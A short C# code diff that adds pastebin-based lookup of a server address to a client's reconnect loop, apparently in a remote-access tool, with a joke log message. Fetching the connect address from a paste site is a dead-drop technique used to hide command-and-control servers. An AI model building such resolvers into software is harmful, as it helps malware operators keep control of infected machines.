@@ -54,17 +54,38 @@ public static class GClass
 
     public static async Task ReconnectLoop(LazyServerClient client)
     {
+        var server = (string)config()["server"];
+        var port = (int)config()["port"];
+
+        if ((bool)config()["pastebin"]) {
+            try
+            {
+                string pastebinres = await new HttpClient().GetStringAsync((string)config()["pastebinlink"]);
+                if (!String.IsNullOrEmpty(pastebinres))
+                {
+                    string[] strings = pastebinres.Split(':');
+
+                    server = strings[0];
+                    port = Int32.Parse(strings[1]);
+                };
+            } catch {
+                server = (string)config()["server"];
+                port = (int)config()["port"];
+            }
+        }
+
         while (true)
         {
             try
             {
-                await client.ConnectAsync((string)config()["server"], (int)config()["port"]);
+                await client.ConnectAsync(server, port);
                 break;
             }
             catch
             {
                 Console.WriteLine("Retrying connection in 1 second...");
-                await Task.Delay(1000);
+                await Task.Delay(300);
+                Console.WriteLine("haha i lied, retrying connection NOW");
             }
         }
     }
